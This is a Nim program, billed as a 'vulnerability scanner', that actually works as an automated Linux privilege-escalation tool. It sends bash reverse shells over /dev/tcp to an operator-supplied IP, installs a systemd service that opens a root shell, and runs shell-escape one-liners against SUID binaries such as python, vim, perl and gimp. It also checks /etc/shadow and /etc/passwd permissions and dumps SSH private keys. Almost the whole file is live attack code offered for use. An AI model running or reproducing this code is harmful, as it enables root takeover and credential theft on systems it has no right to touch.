import strformat, os, strutils, osproc

let red = "\e[31m"
let yellow = "\e[33m"
let cyan = "\e[36m"
let green = "\e[32m"
let blue = "\e[34m"
let default = "\e[0m"

var vulnerable = false

let banner = &"""
----------------------------------------------

            Vulnerabity
               scanner

                 by

          {green}0x454d505459#5042{default}

----------------------------------------------

"""

type EKeyboardInterrupt = object of CatchableError

proc handler() {.noconv.} =
  raise newException(EKeyboardInterrupt, "Keyboard Interrupt")

setControlCHook(handler)

proc read(args: string): string =
  stdout.write(args)
  result = stdin.readline()


proc isnext() =
    let next = read(&"Do you want to try the {blue}next{default} exploits ({green}y{default}/{red}n{default}) ? > ")
    if next == "n":
        echo &"\n{default}Bye ;)"
        quit()
try:
    echo banner
    echo ""
    echo &"Please open a {red}new{default} netcat listener on {cyan}port 5645{default}"
    let ip = read(&"Please enter {red}your{default} IP address > ")

    let me = execCmdEx("whoami")
    if me[0].strip() == "root":
        echo &"{green}LMAO, I got ran with root perms lol; here is a bash shell for you ;){default}"
        discard os.execShellCmd(&"bash -c 'exec bash -i &>/dev/tcp/{ip}/5645 <&1'")
        quit()

    let esca = &"""
    [Unit]
    Description=root

    [Service]
    Type=simple
    User=root
    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{ip}/5645 0>&1'

    [Install]
    WantedBy=multi-user.target


    """

    var passw = ""
    var passw_knowed = false


    let isknow = read(&"Do you know the current users's {blue}password{default}? (y/n) > ")
    if isknow == "y":
        passw = read(&"Pease input the {blue}password{default} > ")
        passw_knowed = true
        echo &"Saved password as {red}{passw}{default}"

    echo ""
    echo red, "!!! LET THE HACK BEGIN !!!", default
    echo ""

    if passw_knowed:
        let cmd = execCmdEx(&"echo {passw} | sudo -S -l")
        let whoami = execCmdEx(&"whoami")
        if "ALL" in cmd[0]:
            echo &"{whoami[0].strip()} has {green}ALL{default} permission, sending back root shell to {ip}:5645..."
            discard os.execShellCmd(&"echo {passw} | sudo -S bash -c 'exec bash -i &>/dev/tcp/{ip}/5645 <&1'")
        else:
            echo &"Here's what this user({whoami[0].strip()}) can use:"
            echo cmd[0]

    echo &"{blue}Looking{default} for {red}SUID{default} permission"
    let suids = execCmdEx("find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null")
    let lines = suids[0].split("\n")
    for line in lines:
        try:
            let path = line.split(' ')[8]

            if "python" in line:
                echo &"{green}FOUND{default} {red}python{default} to be vulnerable"
                echo &"{yellow}INFORMATION:{default} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(&"""{path} -c 'import os; os.execl("/bin/sh", "sh", "-p")'""")
                vulnerable = true
                
            if "systemctl" in line:
                echo &"{green}FOUND{default} {red}systemctl{default} to be vulnerable"
                echo &"{yellow}INFORMATION:{default} If the current exploit doesn't give back a root shell exit to try the next one"
                writeFile("esca.service", esca)
                discard os.execShellCmd(&"{path} link esca.service && systemctl enable --now esca.service")
                vulnerable = true

            if "env" in line:
                echo &"{green}FOUND{default} {red}env{default} to be vulnerable"
                echo &"{yellow}INFORMATION:{default} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(&"{path} /bin/sh -p")
                vulnerable = true

            if "bash" in line:
                echo &"{green}FOUND{default} {red}bash{default} to be vulnerable"
                echo &"{yellow}INFORMATION:{default} If the current exploit doesn't give back a root shell exit to try the next one"
                discard execCmdEx(&"{path} -c 'exec ./bash -p -i &>/dev/tcp/127.0.0.1/5645 <&1'")
                vulnerable = true

            if "chroot" in line:
                echo &"{green}FOUND{default} {red}chroot{default} to be vulnerable"
                echo &"{yellow}INFORMATION:{default} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(&"{path} / /bin/sh -p")
                vulnerable = true

            if "emacs" in line:
                echo &"{green}FOUND{default} {red}emacs{default} to be vulnerable"
                echo &"{yellow}INFORMATION:{default} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(&"""{path} -Q -nw --eval '(term "/bin/sh -p")'""")
                vulnerable = true

            if "make" in line:
                echo &"{green}FOUND{default} {red}make{default} to be vulnerable"
                echo &"{yellow}INFORMATION:{default} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd("COMMAND='/bin/sh -p'")
                discard os.execShellCmd(&"{path} -s --eval=$\'x:\n\t-\'\"$COMMAND")
                vulnerable = true

            if "perl" in line:
                echo &"{green}FOUND{default} {red}perl{default} to be vulnerable"
                echo &"{yellow}INFORMATION:{default} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(&"""{path} -e 'exec "/bin/sh";'""")
                vulnerable = true

            if "vim" in line:
                echo &"{green}FOUND{default} {red}vim{default} to be vulnerable"
                echo &"{yellow}INFORMATION:{default} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(&"""{path} -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'""")
                vulnerable = true
                
            if "zsh" in line:
                echo &"{green}FOUND{default} {red}zsh{default} to be vulnerable"
                echo &"{yellow}INFORMATION:{default} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(path)
                vulnerable = true

            if "time" in line:
                echo &"{green}FOUND{default} {red}time{default} to be vulnerable"
                echo &"{yellow}INFORMATION:{default} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(&"{path} /bin/sh -p")
                vulnerable = true

            if "gimp" in line:
                echo &"{green}FOUND{default} {red}time{default} to be vulnerable"
                echo &"{yellow}INFORMATION:{default} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(&"""{path} -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'""")
                vulnerable = true

        except:
            discard
    
    if not vulnerable:
        echo &"{red}No SUID{default} executable found"

    isnext()
    
    echo ""
    echo &"{blue}Looking{default} for {red}READ{default} permission {blue}/etc/shadow{default}"
    let perms = os.getFilePermissions("/etc/shadow")
    if os.fpOthersRead in perms:
        echo &"{blue}/etc/shadow{default} is {green}readable{default}"
    else:
        echo &"{blue}/etc/shadow{default} is {red}not readable{default}"
    
    echo &"{blue}Looking{default} for {red}WRITE{default} permission {blue}/etc/shadow{default}"
    if os.fpOthersWrite in perms:
        echo &"{blue}/etc/shadow{default} is {green}writeable{default}"
    else:
        echo &"{blue}/etc/shadow{default} is not {red}writeable{default}"


    echo ""
    echo &"{blue}Looking{default} for {red}WRITE{default} permission {blue}/etc/passwd{default}"
    let passw_perms = os.getFilePermissions("/etc/passwd")
    if os.fpOthersWrite in passw_perms:
        echo &"{blue}/etc/passwd{default} is {green}writeable{default}"
    else:
        echo &"{blue}/etc/passwd{default} is not {red}writeable{default}"
    
    isnext()

    echo &"{blue}Looking{default} for ssh {red}private keys{default} in /.ssh"
    if os.dirExists("/.ssh/"):
        let content = execCmdEx("cat /.ssh/*id_rsa*")
        if content[0] == "":
            echo &"{red}NOT KEYS{default} has been found in /.ssh"
        echo content[0]
    else:
        echo &"{red}NOT SSH directory{default} has been found in /"

    echo &"{yellow}INFORMATION{default}: No other exploits available, exiting..."

except EKeyboardInterrupt:
    echo &"\n{default}Bye ;)"
    quit()
